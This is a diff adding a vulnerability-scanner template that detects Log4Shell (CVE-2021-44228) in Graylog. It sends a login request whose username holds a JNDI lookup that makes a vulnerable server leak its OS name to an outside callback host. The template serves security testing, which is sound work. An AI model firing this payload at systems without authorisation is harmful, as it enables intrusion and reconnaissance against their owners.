@@ -1,0 +1,55 @@
+id: graylog-log4j
+
+info:
+  name: GrayLog - Remote Code Execution (Apache Log4j)
+  author: DhiyaneshDK
+  severity: critical
+  description: Graylog uses the Log4j 2 Java library to record its own log information. Versions of this library earlier than 2.15.0 are vulnerable to a remote code execution attack, specifically when specially crafted values sent as user input will be logged by Graylog.
+  reference:
+    - https://www.graylog.org/post/graylog-update-for-log4j
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  metadata:
+    verified: true
+    shodan-query: title:"Graylog Web Interface"
+  tags: cve,cve2021,rce,jndi,log4j,graylog
+
+requests:
+  - raw:
+      - |
+        POST /api/system/sessions HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+        Accept: application/json
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        X-Requested-By: XMLHttpRequest
+        Content-Type: application/json
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}
+
+        {"username":"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
